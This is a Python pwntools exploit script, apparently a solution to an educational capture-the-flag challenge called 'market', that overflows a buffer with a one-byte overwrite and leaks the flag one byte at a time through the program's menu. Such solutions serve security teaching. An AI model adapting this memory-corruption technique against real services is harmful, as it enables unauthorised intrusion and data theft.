from pwn import *

HOST, PORT = 'edu-ctf.zoolab.org', 30209
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./market/share/market')

def exp(offset):
    if args.REMOTE:
        io = remote(HOST,PORT)
    else:
        env = {}
        io = process(exe.path)
        pause()

    io.sendlineafter(b'>', b'no')

    io.sendlineafter(b'>', b'owo')
    io.sendlineafter(b'>', str(0x280).encode())
    payload = b'A' * 0x80 + bytes([offset + 0xC0-1])
    io.sendafter(b'>', payload)

    io.readuntil(b'4. new secret\n')
    io.sendline(str(4).encode())
    io.sendlineafter(b'>', str(0x10).encode())
    io.sendafter(b'>', b'_')
    io.readuntil(b'4. new secret\n')
    io.sendline(str(2).encode())
    io.readuntil(b':')
    r = io.readline().strip()[1:]
    io.close()
    return r

flag = b''
while b'}' not in flag:
    flag += exp(len(flag))

success(flag.decode())
